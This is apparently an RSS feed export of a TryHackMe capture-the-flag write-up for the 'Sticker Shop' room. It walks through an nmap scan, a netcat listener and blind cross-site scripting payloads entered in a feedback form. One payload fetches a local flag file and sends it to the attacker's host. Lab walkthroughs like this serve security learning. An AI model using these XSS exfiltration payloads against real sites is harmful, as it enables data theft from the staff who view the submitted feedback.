@@ -1,0 +1,100 @@
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[The Sticker Shop]]></title><description><![CDATA[Obsidian digital garden]]></description><link>http://github.com/dylang/node-rss</link><image><url>lib/media/favicon.png</url><title>The Sticker Shop</title><link></link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Thu, 02 Jan 2025 11:42:13 GMT</lastBuildDate><atom:link href="lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Thu, 02 Jan 2025 11:42:13 GMT</pubDate><ttl>60</ttl><dc:creator></dc:creator><item><title><![CDATA[The Sticker Shop]]></title><description><![CDATA[ 
+ <br>By <a data-tooltip-position="top" aria-label="https://tryhackme.com/p/tryhackme" rel="noopener nofollow" class="external-link" href="https://tryhackme.com/p/tryhackme" target="_blank">tryhackme</a> and <a data-tooltip-position="top" aria-label="https://tryhackme.com/p/toxicat0r" rel="noopener nofollow" class="external-link" href="https://tryhackme.com/p/toxicat0r" target="_blank">toxicat0r</a><br><img alt="Pasted image 20250102155930.png" src="pasted-image-20250102155930.png"><br>Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!<br>Can you read the flag at http://10.10.132.222:8080/flag.txt<a data-tooltip-position="top" aria-label="http://10.10.132.222:8080/flag.txt" rel="noopener nofollow" class="external-link" href="http://10.10.132.222:8080/flag.txt" target="_blank"></a>?<br><br>
+<br>IP Address: 10.10.132.222
+<br><br><br>sudo nmap -sV -sC 10.10.132.222 -vv -T5 -oA Nmap/TheStickerShop.nmap
+<br>Output:<br>PORT     STATE SERVICE    REASON         VERSION
+22/tcp   open  ssh        syn-ack ttl 60 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 b2:54:8c:e2:d7:67:ab:8f:90:b3:6f:52:c2:73:37:69 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDZ5yrbM4EUF9kvSfSmVTdRWGVeqTTpQpwFopgW7iFN3f/I3mBWiJpAGL8Q8rEs7n8ESeN0yRcr1lGSuUtRqk5Mwei9edFIAGFC0uEJMnO7EQl/3O8PAlTGeuIaEg+YItzpmXOIWfslh0oftoQNN0iWouJFj7DU5QtoiuwK9GIDwD54aaJ6QQHu16nYYk0fTmA2szzSy0nL0fG1I+ILOnVf1SEyDu5a+uHSKA4lERXWsJ6KDhEtxAuf1+uk8x33I4ERJQsGEZ/GbFJsPxbWhFgyvRE9cScm+YpeppPBMwbvicnEg+MZLuDfXAzYCsDvXPem8io/8QlqHXAyTb/hfw8twUiLuWRHPuHH6E4tq+cztlD/BsfydBn+72TEB7dZnRnWP4tAnI5au2KiPA1RA3ud3JNn7Ha7iU0AA5MK9gKhSv/S5tDyLhFbAcLm8ByWzdJ1R5F8NIlWG8C9VDgDuixmIQwsV4D7FthMTsDaM5PuJHr5GDOfT56Mn3fGxQT2W4k=
+|   256 14:29:ec:36:95:e5:64:49:39:3f:b4:ec:ca:5f:ee:78 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKVWb4NfXmP4f5RQIvXlrggi/9cDARgYazfJpJFlRhH/Ypg/QO6JQ0cj+BInTq4qjv9q5f1ksX0KLJxT2sc95WI=
+|   256 19:eb:1f:c9:67:92:01:61:0c:14:fe:71:4b:0d:50:40 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQ5WIN3vZO9KIDXb+PpV5yqA3SVieIqn8jSOGdjDHm1
+8080/tcp open  http-proxy syn-ack ttl 60 Werkzeug/3.0.1 Python/3.8.10
+|_http-title: Cat Sticker Shop
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Server: Werkzeug/3.0.1 Python/3.8.10
+|     Date: Thu, 02 Jan 2025 10:32:45 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 1655
+|     Connection: close
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html&gt;
+|     &lt;head&gt;
+|     &lt;title&gt;Cat Sticker Shop&lt;/title&gt;
+|     &lt;style&gt;
+|     body {
+|     font-family: Arial, sans-serif;
+|     margin: 0;
+|     padding: 0;
+|     header {
+|     background-color: #333;
+|     color: #fff;
+|     text-align: center;
+|     padding: 10px;
+|     header ul {
+|     list-style: none;
+|     padding: 0;
+|     header li {
+|     display: inline;
+|     margin-right: 20px;
+|     header a {
+|     text-decoration: none;
+|     color: #fff;
+|     font-weight: bold;
+|     .content {
+|     padding: 20px;
+|_    .product {
+|_http-server-header: Werkzeug/3.0.1 Python/3.8.10
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8080-TCP:V=7.94SVN%I=7%D=1/2%Time=67766B4E%P=x86_64-pc-linux-gnu%r(
+SF:GetRequest,726,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.1\x
+SF:20Python/3\.8\.10\r\nDate:\x20Thu,\x2002\x20Jan\x202025\x2010:32:45\x20
+SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\
+SF:x201655\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html&gt;\n&lt;hea
+SF:d&gt;\n\x20\x20\x20\x20&lt;title&gt;Cat\x20Sticker\x20Shop&lt;/title&gt;\n\x20\x20\x20
+SF:\x20&lt;style&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20Arial,\x20sans-serif;\
+SF:n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200;\n\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x200;\n\x20\x20\x20\x
+SF:20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20header\x20{\n\x20\
+SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#333;\n
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#fff;\n\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-align:\x20center;\n\x20\
+SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2010px;\n\x20\x20\
+SF:x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20header\x20ul\
+SF:x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20list-style:\x20no
+SF:ne;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x200;\n\x
+SF:20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20header
+SF:\x20li\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x
+SF:20inline;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-right
+SF::\x2020px;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20
+SF:\x20\x20header\x20a\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20text-decoration:\x20none;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0font-weight:\x20bold;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\.content\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20padding:\x2020px;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\.product\x20{\n\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20bo");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+<br>Found Two port open<br>
+<br>Port 8080
+<br>Port 22
+<br>Now, let's add the IP Address to our /etc/hosts file to assign a domain name to it.<br>10.10.132.222 thestickershop.thm
+<br>Now, we can explore the Web application on the Port 8080<br><img alt="Pasted image 20250102165736.png" src="pasted-image-20250102165736.png"><br>The web application contains two parts, One is the static Home Page and the other is a Feedback page.<br>The FeedBack Page contains an input box for us to enter any input to it.<br><img alt="Pasted image 20250102165900.png" src="pasted-image-20250102165900.png"><br>And We get an output Thanks for your feedback! It will be evaluated shortly by our staff<br><img alt="Pasted image 20250102165947.png" src="pasted-image-20250102165947.png"><br>Which might give us an potential to have a Blind Cross Site Scripting.<br><br>To confirm this, let's start a listener at our local host system and then try to pass in a request payload from the input box to see if we get any request back the system.<br>First, let's create a listener.<br>nc -lvnp 80
+<br><img alt="Pasted image 20250102170205.png" src="pasted-image-20250102170205.png"><br>Now, Let's submit a payload to the Server.<br>'"&gt;&lt;script src=http://--Your IP Address--&gt;&lt;/script&gt;
+<br><img alt="Pasted image 20250102170352.png" src="pasted-image-20250102170352.png"><br>And submit the Payload to the server and wait to see if you get any request back to your terminal.<br><img alt="Pasted image 20250102170504.png" src="pasted-image-20250102170504.png"><br>AND WE GET!!!!!!!!!<br>Now!! Let's exploit for the flag.txt<br>Once again the listener using netcat.<br>nc -lvnp 80
+<br>Now, pass in this payload.<br>'"&gt;&lt;script&gt;
+  fetch('http://127.0.0.1:8080/flag.txt')
+    .then(response =&gt; response.text())
+    .then(data =&gt; {
+      fetch('http://&lt;--Your IP Address--&gt;/?flag=' + encodeURIComponent(data));
+    });
+&lt;/script&gt;
+<br><img alt="Pasted image 20250102170718.png" src="pasted-image-20250102170718.png"><br><img alt="Pasted image 20250102170955.png" src="pasted-image-20250102170955.png"><br>And We get the Flag!!!!!<br>Now copy this flag and using URL Decode operator of <a data-tooltip-position="top" aria-label="https://cyberchef.org/#recipe=URL_Decode()&amp;input=VEhNJTdCODM3ODlhNjkwNzRmNjM2ZjY0YTM4ODc5Y2ZjYWJlOGI2MjMwNWVlNiU3RA" rel="noopener nofollow" class="external-link" href="https://cyberchef.org/#recipe=URL_Decode()&amp;input=VEhNJTdCODM3ODlhNjkwNzRmNjM2ZjY0YTM4ODc5Y2ZjYWJlOGI2MjMwNWVlNiU3RA" target="_blank">CyberChef</a> decode the flag and submit.<br><img alt="Pasted image 20250102171119.png" src="pasted-image-20250102171119.png"><br>There we go!!!!]]></description><link>the-sticker-shop.html</link><guid isPermaLink="false">The Sticker Shop.md</guid><pubDate>Thu, 02 Jan 2025 11:41:25 GMT</pubDate><enclosure url="pasted-image-20250102155930.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;pasted-image-20250102155930.png&quot;&gt;&lt;/figure&gt;</content:encoded></item></channel></rss>
